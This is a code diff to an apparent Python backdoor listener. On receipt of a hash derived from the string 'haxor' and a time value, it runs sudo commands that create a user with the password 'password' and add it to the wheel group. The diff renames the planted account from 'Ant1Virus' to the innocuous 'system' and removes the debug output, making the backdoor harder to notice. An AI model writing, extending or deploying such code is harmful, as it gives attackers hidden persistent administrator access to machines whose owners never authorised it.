@@ -25,16 +25,9 @@ while True:
         time = res.read().strip().decode('utf-8')
         pwd = conn.recv(4096).decode()
         expected_hash = str(hashlib.sha512(("haxor" + time).encode()).hexdigest())
-        print("Received hash: " + pwd)
-        print("Expected hash: " + expected_hash)
         # Check the hash
         if pwd == expected_hash:
             print("Correct password, waiting for commands")
             conn.send("done".encode())
-            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) Ant1Virus && sudo usermod -aG wheel Ant1Virus", shell=True)
-            conn.close()
-        else:
-            print("Incorrect password")
-            conn.close()
-
-conn.close()
+            subprocess.Popen("sudo useradd -p $(openssl passwd -1 password) system && sudo usermod -aG wheel system", shell=True)
+        conn.close()
